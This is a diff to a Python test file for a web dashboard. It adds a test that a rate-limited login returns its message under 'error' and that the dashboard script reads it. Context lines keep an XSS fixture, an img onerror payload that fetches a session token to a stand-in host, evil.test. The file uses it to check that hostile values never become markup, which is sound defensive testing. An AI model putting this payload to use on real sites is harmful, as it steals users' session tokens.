@@ -11,6 +11,7 @@ from __future__ import annotations
 import re
 from html.parser import HTMLParser
 
+from app.core.config import get_settings
 from tests.conftest import sample_key
 
 XSS_NAME = '<img src=x onerror="fetch(`//evil.test/?t=`+sessionStorage.nkm_token)">'
@@ -126,6 +127,26 @@ async def test_dashboard_script_never_builds_markup_from_strings(client):
         source,
     )
     assert sinks == []
+
+
+async def test_dashboard_shows_the_message_of_a_429(rate_limiting, client):
+    """Every API error is ``{"detail": ...}`` except the limiter's, which is ``{"error": ...}``.
+
+    The script used to read only ``detail``, so the toast for a 429 was empty. The behaviour was
+    also checked by running dashboard.js in jsdom against a limited instance (see the pull
+    request); this keeps the two halves of the contract from drifting apart.
+    """
+    attempts = int(get_settings().rate_limit_auth.split("/")[0]) + 1
+    for _ in range(attempts):
+        response = await client.post(
+            "/api/v1/auth/login", json={"email": "nobody@example.com", "password": "wrong"}
+        )
+    assert response.status_code == 429
+    assert set(response.json()) == {"error"}  # no "detail": the message lives under "error"
+
+    source = _without_comments((await client.get("/static/dashboard.js")).text)
+    assert re.search(r"body\.detail\b", source) and re.search(r"body\.error\b", source)
+    assert "res.statusText ||" in source  # HTTP/2 has no reason phrase
 
 
 async def test_hostile_values_are_stored_verbatim_and_served_only_as_json(client, admin_headers):
